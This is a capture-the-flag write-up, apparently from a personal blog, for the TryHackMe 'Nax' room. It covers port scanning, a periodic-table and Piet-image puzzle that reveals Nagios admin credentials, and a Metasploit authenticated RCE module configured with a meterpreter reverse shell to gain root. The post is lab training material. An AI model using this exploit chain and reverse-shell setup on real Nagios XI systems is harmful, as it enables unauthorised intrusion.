---
title: "Nax"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="nax.png" alt="nax" style="width: 200px;" >}}

## Enumeration

```bash
 PORT    STATE SERVICE   REASON  VERSION
 22/tcp  open  ssh       syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCw9lXSbmWYgGcDpP5NiHE9MMRQktk72HpmKY50dVs/GbfJMNa29eJNKsZ2XfAVsGUuxRdX42/fvaAUOoSZlNlARJUOhS+3fRX14Qx9itHqEoYTXXnSZ+lYc4HGbMkbGlbW3CqQ6zxO9kEbe8DbFi9BPkGOvjMk5mrVYqOpROlZwJvwCtK4g+LNkZibj3VZvZ+Ex410r4Xqd4TeIe+NRVmCEG5I57w60wZTwS6WAhQ86Td8ZhDr0hlN82vKe8KK8Q6Qyt4NNa4GrwJAil0DMSSrSdgiFPWfSBN0RcaGq6xTyd3m4bUmKfqSJ+hhvpoQ5CJNQK5dtIfLulV5iEVWXKtV
 |   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
 | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA6AY/MaydX6jLtiYXUhTaSQuNB4h08nsJd8MIxQ4b77d5qBK89b0rXrmxH8TavI5HpHOnAYeSMWcgrWcKAnBXk=
 |   256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICcps6PPy9z/iS7bgKohT/GXERf6a6hWzhuWyeNMtzcw
 25/tcp  open  smtp      syn-ack Postfix smtpd
 |_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
 |_ssl-date: TLS randomness does not represent time
 | ssl-cert: Subject: commonName=ubuntu
 | Issuer: commonName=ubuntu
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2020-03-23T23:42:04
 | Not valid after:  2030-03-21T23:42:04
 | MD5:   9b85 15ad 46a7 016e 319a 033d 7d96 edbe
 | SHA-1: c488 0c2d a210 38dd cfbb a299 4a2a b69c 63fd 2cdc
 | -----BEGIN CERTIFICATE-----
 | MIICsjCCAZqgAwIBAgIJAMztBzdUafrfMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
 | BAMMBnVidW50dTAeFw0yMDAzMjMyMzQyMDRaFw0zMDAzMjEyMzQyMDRaMBExDzAN
 | BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM4f
 | Mj+6LmA7krMf32EdXKtdfPVFVFf3367a+trh4/H6MHZJVOpZ+CrH1j4RTjr9SONC
 | l5Fzrz1hR1o1oXIwsAXrtqcvYGeNT7gwH4D6m6zifSaOAWEy/IMsbe3+sPMIUPlS
 | 4NdFl4J6PeyeAAnShUzAOAdUqsvSsAmmvN3ze+Y2OGGfOlO1s7n25FDs72zXo2nX
 | i1EO+1mVdUWuM/Qr8Zctilwv9QNPWxcoTG/Zac/q8/pboWaUg3pf6mfFLbwo96ba
 | 8p8QR8gfD1Vc1xQMN98/2lPxo8ISkW9ffcBzy0ILIhkSD/8EmynmC7FhgogCU+/l
 | fYpeC3wLLigkDZnOgL0CAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
 | AAOCAQEABDjkkOLVJfqNq1qSDGBgu7IJCG1CAByl82DGlam2nsVBhji54hviiyBi
 | euCyeqJRPOX2qS7Kl0scMFw+DVxNW867HcrtTYEHuo1gOCGX3QFz+eUuKf+4X1Wr
 | a7VgSeYVhboT4w4tKm8Rprh7QkHp9MNTB9TR/edG9RtFJZXtSlykeS5lLeC3DjRw
 | 0NhWpgG2ZLa9URDrpzErvVwOBN46IS0PqwDCxJSvsH6sBQhgrm5so71jrPHwmh/o
 | aaqO96Rw+1aRRLwz0O0TEO4aMw8/seeiRJ8w4kXMOy9UrCM5+yW6fbtMKYsmEPJO
 | RxSanrURYb9UJxdRfeWPqWYU1AHVwg==
 |_-----END CERTIFICATE-----
 80/tcp  open  http      syn-ack Apache httpd 2.4.18 ((Ubuntu))
 |_http-title: Site doesn't have a title (text/html).
 | http-methods:
 |_  Supported Methods: OPTIONS GET HEAD POST
 389/tcp open  ldap      syn-ack OpenLDAP 2.2.X - 2.3.X
 443/tcp open  ssl/https syn-ack Apache/2.4.18 (Ubuntu)
 | http-methods:
 |_  Supported Methods: GET HEAD POST
 |_http-title: 400 Bad Request
 | tls-alpn:
 |_  http/1.1
 | ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul
 | Issuer: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul
 | Public Key type: rsa
 | Public Key bits: 2048
 | Signature Algorithm: sha1WithRSAEncryption
 | Not valid before: 2020-03-24T00:14:58
 | Not valid after:  2030-03-22T00:14:58
 | MD5:   636c ab0f 6399 34e3 b6de e6e2 b294 d4ef
 | SHA-1: 80cd 2e1b 110f 1b5f 1943 1b3f c218 71e7 8b98 6801
 | -----BEGIN CERTIFICATE-----
 | MIIDzTCCArWgAwIBAgIBADANBgkqhkiG9w0BAQUFADCBgDELMAkGA1UEBhMCVVMx
 | EjAQBgNVBAgMCU1pbm5lc290YTERMA8GA1UEBwwIU3QuIFBhdWwxGzAZBgNVBAoM
 | Ek5hZ2lvcyBFbnRlcnByaXNlczEUMBIGA1UECwwLRGV2ZWxvcG1lbnQxFzAVBgNV
 | BAMMDjE5Mi4xNjguODUuMTUzMB4XDTIwMDMyNDAwMTQ1OFoXDTMwMDMyMjAwMTQ1
 | OFowgYAxCzAJBgNVBAYTAlVTMRIwEAYDVQQIDAlNaW5uZXNvdGExETAPBgNVBAcM
 | CFN0LiBQYXVsMRswGQYDVQQKDBJOYWdpb3MgRW50ZXJwcmlzZXMxFDASBgNVBAsM
 | C0RldmVsb3BtZW50MRcwFQYDVQQDDA4xOTIuMTY4Ljg1LjE1MzCCASIwDQYJKoZI
 | hvcNAQEBBQADggEPADCCAQoCggEBANdnw2CkJpNnnwjJ+PaxonTH/G5TSKLru67c
 | aQyy4FhI/xa+0Dwn/HjWnWIOE3gOQB7QyOyG30guUpFohUEtC9agL7tpogpxrV8l
 | ie0vhXsz0ETdzMhaou6QOrLS1OSspAh+t492t71BILl6ReHPLoFyEghyRctP/iK0
 | PelUJKndJ2ElpLdbkMUuVzQ9mp8qIjoTF4CS1JwiUESCtikRmZWp398buklzNGgF
 | VZIRJPu5VZMPGc7Ui3QUSaTF2aqi9FRXZRXN+0q2nWvdUFrUqnzrmaVynOupGXhS
 | O17VZtC9F/GM+yWpg3Lck9wevt5o3nnYW4k8h5kDNHu4f0oDR88CAwEAAaNQME4w
 | HQYDVR0OBBYEFFRhBQ3MZkrfjRqOlHjApJZAN+juMB8GA1UdIwQYMBaAFFRhBQ3M
 | ZkrfjRqOlHjApJZAN+juMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEB
 | ABeWyFzGfxf3vmGuLXdDXVj5e1LwBlvoNmHGf11Buy/yljpUI6jg1HxUTSABU/iS
 | ZSsCnwOQ5dtqRAIcvFp07ZlUw9DpeSChj2jxXw+YxINOSqqNgE66zelXV9rJb7TX
 | HWho2/g6OzKs5ii2h5lyjlValQAgfxBYJpRjvf4FfIJpzL+RnrsOqJBNUurbAn1L
 | yNkqSDJhCPNN/g0V6eyOZRjTipV2FzcHYrbt84qFPN8gQ5Rpd6wNOWoUfuY1tL6H
 | yepaZ/iLv+wY60Kxd8+GD4Oy7Tpz+Ilkr48EIUffejHzVrcn7JikS8+Uf8nvDi9Q
 | LnC7LykFocxS13IXPcTfrnI=
 |_-----END CERTIFICATE-----
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_ssl-date: TLS randomness does not represent time
 Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```bash
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
cgi-bin/                [Status: 403, Size: 277, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 1332, Words: 629, Lines: 29]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 2968, Words: 766, Lines: 72]
nagios                  [Status: 401, Size: 459, Words: 42, Lines: 15]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

After visiting the website we get a weird page with `"elements"`
periodic table elements `Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr`
The corresponding numbers (atomic value) are found on google and we check if those are `ASCII` chars:

`python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"`

```text
/PI3T.PNg
```

A hidden png? lets go get that and extract exif data from it

{{< post-img src="PI3T.png" alt="piet" style="width: 200px;" >}}

```bash
exiftool /PI3T.PNg
ExifTool Version Number : 12.16
File Name : PI3T.PNg
Directory : /home/nair0lf32/Desktop/Stuff/THM/Nax
File Size : 959 KiB
File Modification Date/Time : 2021:11:02 00:29:28+01:00
File Access Date/Time : 2021:11:02 00:29:28+01:00
File Inode Change Date/Time : 2021:11:02 00:29:28+01:00
File Permissions : rw-r--r--
File Type : PNG
File Type Extension : png
MIME Type : image/png
Image Width : 990
Image Height : 990
Bit Depth : 8
Color Type : Palette
Compression : Deflate/Inflate
Filter : Adaptive
Interlace : Noninterlaced
Palette : (Binary data 768 bytes, use -b option to extract)
Transparency : (Binary data 256 bytes, use -b option to extract)
Artist : Piet Mondrian
Copyright : Piet Mondrian, tryhackme 2020
Image Size : 990x990
Megapixels : 0.980
```

Googling piet mondrian looking for others steganograpy methods
SEEMS LIKE A LANGUAGE CALLED PIET WAS CREATED AFTER THE AUTHOR'S
let's google more about PIET

And there is an online tool to execute that at `https://www.bertnase.de/npiet/npiet-execute.php`

```bash
libpng warning: Extra compressed data.
libpng warning: Extra compression data.
nagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYna
```

From that horribly long sequence we notice its just credentials repeated with url encoded like separator (%)

So we get

`nagiosadmin : n3p3UQ&9BjLp4$7uhWdY`

we can use that to login at `nagios` page

```text
Nagios XI 5.5.6
```

We google it...and it seems that its an interesting one

```text
CVE-2019-15949 : CRITICAL RCE to root with getprofile.sh
CVE-2018-15708 : CRITICAL remote command execution
CVE-2018-15710 : HIGH privilege escalation via Autodiscover_new.php.
```

First one is the most "critical"
we fire metasploit up and use

`exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce`

```bash
Module options (exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce):

Name Current Setting Required Description

---

FINISH_INSTALL false no If the Nagios XI installation has not been completed, try to do so. This includes signing the license agreement.
PASSWORD n3p3UQ&9BjLp4$7uhWdY yes Password to authenticate with
Proxies no A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS 10.10.79.218 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
RPORT 80 yes The target port (TCP)
SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT 8080 yes The local port to listen on.
SSL false no Negotiate SSL/TLS for outgoing connections
SSLCert no Path to a custom SSL certificate (default is randomly generated)
TARGETURI /nagiosxi/ yes The base path to the Nagios XI application
URIPATH no The URI to use for this exploit (default is random)
USERNAME nagiosadmin yes Username to authenticate with
VHOST no HTTP server virtual host

Payload options (linux/x64/meterpreter/reverse_tcp):

Name Current Setting Required Description

---

LHOST 10.8.226.203 yes The listen address (an interface may be specified)
LPORT 4444 yes The listen port

Exploit target:

Id Name

---

1 Linux (x64)
```

And we get a meterpreter session
we go /home/galand for first flag

```bash
meterpreter > cat user.txt
THM{nax_user_flag}
```

Time for more privileges...
haha joking...not this time...we already root (most critical RCE vuln duh)

```bash
meterpreter > getuid
Server username: root
```

```bash
meterpreter > cat root.txt
THM{nax_root_flag}
```

that was a CRITICAL hit
